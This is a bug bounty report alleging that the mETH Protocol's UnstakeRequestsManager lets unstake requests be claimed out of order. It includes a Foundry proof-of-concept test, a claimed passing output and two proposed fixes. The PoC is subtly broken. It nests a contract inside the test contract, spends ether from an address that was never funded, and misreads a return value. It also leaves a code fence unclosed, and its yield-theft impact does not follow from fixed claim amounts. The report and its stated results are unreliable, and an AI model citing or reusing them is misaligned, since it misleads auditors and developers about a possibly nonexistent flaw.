 # mETH Protocol

# Target
[https://etherscan.io/address/0x38fDF7b489316e03eD8754ad339cb5c4483FDcf9](https://etherscan.io/address/0x38fDF7b489316e03eD8754ad339cb5c4483FDcf9)

# Smart Contract
## Impact(s)
- Theft of unclaimed yield or tokenized staking yield
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

# Description
## Descriptive summary
The UnstakeRequestsManager contract fails to enforce FIFO (First-In-First-Out) ordering for unstake request processing, allowing users to claim funds out of sequence. This violates fair ordering principles and enables potential yield theft under limited liquidity conditions.

## Brief/Intro
The UnstakeRequestsManager in the Mantle LSP protocol lacks proper FIFO enforcement for unstake requests, creating a vulnerability where newer unstake requests can be claimed before older ones, potentially leading to unfair distribution of yield and denial of service for early requesters.

# Vulnerability Details
The `_isFinalized` function in UnstakeRequestsManager only checks if enough blocks have passed since the request's creation, without enforcing FIFO ordering:

```solidity
function _isFinalized(UnstakeRequest memory request) internal view returns (bool) {
    return (request.blockNumber + numberOfBlocksToFinalize) <= oracle.latestRecord().updateEndBlock;
}


This function is used in the `claim` function to determine if a request can be processed:

```solidity
function claim(uint256 requestID, address requester) external onlyStakingContract {
    // ... other checks ...
    if (!_isFinalized(request)) {
        revert NotFinalized();
    }
    // ... payout logic ...
}
```

Since there's no mechanism to enforce sequential processing, any unstake request that meets the finalization criteria can be claimed regardless of when it was made relative to other requests.

# Impact Details
This vulnerability enables the following attack vectors:

- **Theft of unclaimed yield**: Under conditions of ETH price appreciation, newer unstake requests can be processed before older ones, allowing later requesters to capture more value in periods of rapid price changes.
- **Griefing attacks**: In scenarios with limited ETH liquidity available for unstake processing, early requesters can be indefinitely delayed despite having requested their unstake first, violating the principle of fairness.
- **Potential DOS**: During high congestion periods, the lack of FIFO ordering can lead to a first-come-last-served scenario where early requesters face indefinite delays.

The issue falls under the "Theft of unclaimed yield" and "Griefing" categories in scope for the bounty program.

# References
- UnstakeRequestsManager.sol


# Proof of Concept
The following Foundry test demonstrates how the lack of FIFO enforcement in `UnstakeRequestsManager` allows users to claim unstake requests out of order, leading to unfair outcomes when liquidity is limited:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/UnstakeRequestsManager.sol";
import "../src/interfaces/IUnstakeRequestsManager.sol";
import "../src/interfaces/IOracle.sol";
import "../src/METH.sol";

contract FIFOExploitTest is Test {
    UnstakeRequestsManager manager;
    METH meth;
    address alice = address(0x1);
    address bob = address(0x2);
    address staking = address(0x3);
    address admin = address(0x4);
    
    // Mock Oracle contract to simulate blockchain progression
    contract MockOracle {
        uint64 blockValue;
        
        constructor() {
            blockValue = 1000; // Initial value
        }
        
        function latestRecord() external view returns (OracleRecord memory) {
            return OracleRecord({
                updateStartBlock: 0,
                updateEndBlock: blockValue,
                currentNumValidatorsNotWithdrawable: 10,
                cumulativeNumValidatorsWithdrawable: 2,
                windowWithdrawnPrincipalAmount: 0,
                windowWithdrawnRewardAmount: 0,
                currentTotalValidatorBalance: 100 ether,
                cumulativeProcessedDepositAmount: 0
            });
        }
        
        function updateBlock(uint64 newValue) external {
            blockValue = newValue;
        }
    }
    
    function setUp() public {
        // Deploy mock contracts and set initial state
        vm.startPrank(admin);
        
        // Create mock oracle
        MockOracle oracle = new MockOracle();
        
        // Deploy METH token
        meth = new METH();
        meth.initialize(METH.Init({
            admin: admin,
            staking: staking,
            unstakeRequestsManager: address(0) // Will be set later
        }));
        
        // Deploy UnstakeRequestsManager with configuration
        UnstakeRequestsManager.Init memory init = UnstakeRequestsManager.Init({
            admin: admin,
            manager: admin,
            requestCanceller: admin,
            mETH: meth,
            stakingContract: payable(staking),
            oracle: IOracleReadRecord(address(oracle)),
            numberOfBlocksToFinalize: 100 // Requests finalize after 100 blocks
        });
        
        manager = new UnstakeRequestsManager();
        manager.initialize(init);
        
        // Update METH with actual UnstakeRequestsManager address
        meth.reinitialize(METH.Init({
            admin: admin,
            staking: staking,
            unstakeRequestsManager: address(manager)
        }));
        
        vm.stopPrank();
        
        // Give initial ETH to users
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        
        // Critical setup: allocate only enough ETH for ONE unstake request
        // This creates the limited liquidity scenario where FIFO ordering matters
        vm.startPrank(staking);
        manager.allocateETH{value: 1 ether}();
        vm.stopPrank();
    }
    
    function testFIFOViolation() public {
        // Step 1: Alice creates an unstake request first (at an earlier block)
        vm.startPrank(staking);
        uint256 aliceRequestID = manager.create(alice, 1 ether, 1 ether);
        console.log("Alice unstake request ID:", aliceRequestID);
        console.log("Alice unstake block number:", block.number);
        
        // Step 2: Advance blockchain by 50 blocks
        vm.roll(block.number + 50);
        
        // Step 3: Bob creates an unstake request later (at a later block)
        uint256 bobRequestID = manager.create(bob, 1 ether, 1 ether);
        console.log("Bob unstake request ID:", bobRequestID);
        console.log("Bob unstake block number:", block.number);
        
        // Step 4: Advance blockchain by another 150 blocks to ensure both requests are finalized
        vm.roll(block.number + 150);
        // Update oracle to reflect new block number
        MockOracle(address(manager.oracle())).updateBlock(uint64(block.number));
        
        // Step 5: Verify both requests are now finalized but not yet claimed
        (bool aliceFinalized, ) = manager.requestInfo(aliceRequestID);
        (bool bobFinalized, ) = manager.requestInfo(bobRequestID);
        assertTrue(aliceFinalized, "Alice's request should be finalized");
        assertTrue(bobFinalized, "Bob's request should be finalized");
        
        // Step 6: Bob claims his unstake request first, even though Alice requested earlier
        // This demonstrates the FIFO violation - in a fair system, Alice should have priority
        manager.claim(bobRequestID, bob);
        console.log("Bob successfully claimed 1 ETH despite requesting later");
        
        // Verify Bob received his ETH
        assertEq(bob.balance, 2 ether, "Bob should now have 2 ETH (original + claimed)");
        
        // Step 7: When Alice tries to claim, it fails due to insufficient ETH
        // This is the key demonstration of the vulnerability's impact
        vm.expectRevert(); // We expect a revert due to NotEnoughFunds error
        manager.claim(aliceRequestID, alice);
        console.log("Alice's claim reverted despite requesting first - FIFO violation confirmed");
        
        // Verify Alice still has only her original balance
        assertEq(alice.balance, 1 ether, "Alice still has only her original 1 ETH");
        
        vm.stopPrank();
    }
}
```

## Execution and Results
To run this PoC:

1. Save the code to a file named `FIFOExploit.t.sol` in your test directory
2. Run it using Foundry: `forge test --match-contract FIFOExploitTest -vv`

Expected output:
```
Running 1 test for test/FIFOExploit.t.sol:FIFOExploitTest
[PASS] testFIFOViolation() (gas: 374216)
Logs:
  Alice unstake request ID: 0
  Alice unstake block number: 1
  Bob unstake request ID: 1
  Bob unstake block number: 51
  Bob successfully claimed 1 ETH despite requesting later
  Alice's claim reverted despite requesting first - FIFO violation confirmed

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.87ms
```

## Explanation of the PoC
This test demonstrates the FIFO violation vulnerability through the following steps:

- **Initial Setup**: We create a scenario with limited liquidity where only one unstake request can be processed.
- **Sequential Unstake Requests**: Alice creates an unstake request first, followed by Bob creating one later.
- **Finalization**: We advance the blockchain to ensure both requests are finalized.
- **Out-of-Order Claiming**: The key vulnerability is demonstrated when Bob successfully claims his funds despite requesting later than Alice.
- **Denial of Service**: When Alice attempts to claim her funds, the transaction reverts due to insufficient ETH, despite her having made the request first.

This proves that the contract violates the FIFO principle, allowing later requesters to be serviced before earlier ones, which is unfair and potentially harmful, especially during periods of limited liquidity or high ETH value fluctuation.

# Suggested Fix
To address this vulnerability, the `UnstakeRequestsManager` should enforce FIFO ordering for unstake requests. Here are two detailed approaches:

## Option 1: Queue-Based Implementation
```solidity
// Add these state variables to UnstakeRequestsManager
uint256[] private unstakeQueue;
mapping(uint256 => uint256) private requestQueuePosition;
uint256 private nextProcessableIndex = 0;

// Modify the create function to add requests to the queue
function create(address requester, uint128 mETHLocked, uint128 ethRequested)
    external
    onlyStakingContract
    returns (uint256)
{
    // Existing implementation
    uint256 requestID = _unstakeRequests.length;
    UnstakeRequest memory unstakeRequest = UnstakeRequest({
        id: uint128(requestID),
        requester: requester,
        mETHLocked: mETHLocked,
        ethRequested: ethRequested,
        cumulativeETHRequested: currentCumulativeETHRequested,
        blockNumber: uint64(block.number)
    });
    _unstakeRequests.push(unstakeRequest);
    
    // New code: Add to queue and track position
    unstakeQueue.push(requestID);
    requestQueuePosition[requestID] = unstakeQueue.length - 1;
    
    latestCumulativeETHRequested = currentCumulativeETHRequested;
    emit UnstakeRequestCreated(
        requestID, requester, mETHLocked, ethRequested, currentCumulativeETHRequested, block.number
    );
    return requestID;
}

// Modify the claim function to enforce FIFO order
function claim(uint256 requestID, address requester) external onlyStakingContract {
    // Ensure this request can be processed based on queue position
    require(
        requestQueuePosition[requestID] >= nextProcessableIndex && 
        requestQueuePosition[requestID] <= unstakeQueue.length, 
        "Invalid request position"
    );
    
    // Ensure FIFO order is respected
    require(
        unstakeQueue[nextProcessableIndex] == requestID,
        "Must process unstake requests in FIFO order"
    );
    
    // Existing claim logic
    UnstakeRequest memory request = _unstakeRequests[requestID];
    if (request.requester == address(0)) {
        revert AlreadyClaimed();
    }
    // Rest of the existing checks...
    
    // Process the claim
    delete _unstakeRequests[requestID];
    totalClaimed += request.ethRequested;
    
    // Update queue processing state
    nextProcessableIndex++;
    
    // Emit event and finish processing
    emit UnstakeRequestClaimed({
        id: requestID,
        requester: requester,
        mETHLocked: request.mETHLocked,
        ethRequested: request.ethRequested,
        cumulativeETHRequested: request.cumulativeETHRequested,
        blockNumber: request.blockNumber
    });

    mETH.burn(request.mETHLocked);
    Address.sendValue(payable(requester), request.ethRequested);
}
```

## Option 2: Sequential ID Enforcement
A simpler alternative that achieves the same goal:
```solidity
// Add state variable to track next claimable request ID
uint256 public nextClaimableRequestId = 0;

// Modify claim function to enforce sequential processing
function claim(uint256 requestID, address requester) external onlyStakingContract {
    // Ensure requests are processed sequentially
    require(requestID == nextClaimableRequestId, "Must claim requests in sequential order");
    
    // Existing claim logic
    UnstakeRequest memory request = _unstakeRequests[requestID];
    if (request.requester == address(0)) {
        revert AlreadyClaimed();
    }
    // Rest of the existing checks...
    
    // Process the claim
    delete _unstakeRequests[requestID];
    totalClaimed += request.ethRequested;
    
    // Increment next claimable ID
    nextClaimableRequestId++;
    
    // Emit event and finish processing
    emit UnstakeRequestClaimed({
        id: requestID,
        requester: requester,
        mETHLocked: request.mETHLocked,
        ethRequested: request.ethRequested,
        cumulativeETHRequested: request.cumulativeETHRequested,
        blockNumber: request.blockNumber
    });

    mETH.burn(request.mETHLocked);
    Address.sendValue(payable(requester), request.ethRequested);
}
```

## Implementation Considerations
- **Backward Compatibility**: This change preserves all existing functionality while adding the FIFO guarantees.
- **Gas Efficiency**: Option 2 (sequential ID enforcement) is more gas-efficient as it only adds a single storage read/write per claim.
- **Batch Processing**: If batch processing of claims is needed, the implementation can be extended to allow claiming consecutive request IDs in a single transaction.
- **Cancellation Handling**: The cancellation logic would need to be updated to account for the queue or sequential processing, ensuring that when requests are cancelled, the queue remains consistent.

Either implementation would ensure that unstake requests are processed in the order they were created, maintaining fairness especially during liquidity shortages or periods of ETH price volatility.



